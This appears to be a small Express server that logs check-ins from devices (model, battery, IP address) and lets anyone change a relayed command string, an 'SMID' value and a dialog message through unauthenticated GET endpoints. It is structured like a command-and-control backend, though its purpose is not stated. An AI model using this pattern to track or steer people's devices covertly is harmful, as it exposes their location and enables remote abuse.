const express = require("express");

const app = express();
const PORT = process.env.PORT || 3000;

// -------------------------------
// 🔥 GLOBAL STORAGE
// -------------------------------
let SMID = "B55e1f5b3-5e7b-4c6d-9a31-b8f2d6e4c324";
let CMD = "safe";
let dialogMessage = "Default Message";

// device store
let devices = {};

// -------------------------------
// 🔥 DEVICE PING
// -------------------------------
app.get("/ping", (req, res) => {
  const id = req.query.id;

  if (!id) return res.send("missing id");

  const rawIp = req.headers["x-forwarded-for"];
  const ip = rawIp
    ? rawIp.split(",")[0].trim()
    : req.socket.remoteAddress;

  devices[id] = {
    model: req.query.model || "unknown",
    battery: req.query.battery || "unknown",
    ip: ip,
    lastSeen: new Date().toLocaleString()
  };

  res.send("ok");
});

// -------------------------------
app.get("/devices", (req, res) => {
  res.json(devices);
});

// -------------------------------
// 🔥 DIALOG MESSAGE (IMPORTANT)
// -------------------------------
app.get("/api/dialog-text", (req, res) => {
  res.json({
    message: dialogMessage
  });
});

// 🔥 SET MESSAGE FROM BROWSER
app.get("/set-message", (req, res) => {
  const value = req.query.value;

  if (!value) {
    return res.send("Usage: /set-message?value=TEXT");
  }

  dialogMessage = value;

  console.log("Message updated:", dialogMessage);

  res.send("Updated: " + dialogMessage);
});

// -------------------------------
// ⚙️ COMMAND CONTROL
// -------------------------------
app.get("/cmd", (req, res) => {
  res.send(CMD.trim());
});

app.get("/set-cmd", (req, res) => {
  CMD = req.query.value || "safe";
  res.send("CMD: " + CMD);
});

// -------------------------------
// 🔑 SMID
// -------------------------------
app.get("/smid", (req, res) => {
  res.send(SMID);
});

app.get("/set-smid", (req, res) => {
  SMID = req.query.value || SMID;
  res.send("SMID: " + SMID);
});

// -------------------------------
app.get("/", (req, res) => {
  res.send("Server Running");
});

app.listen(PORT, () => {
  console.log("Server running on port", PORT);
});
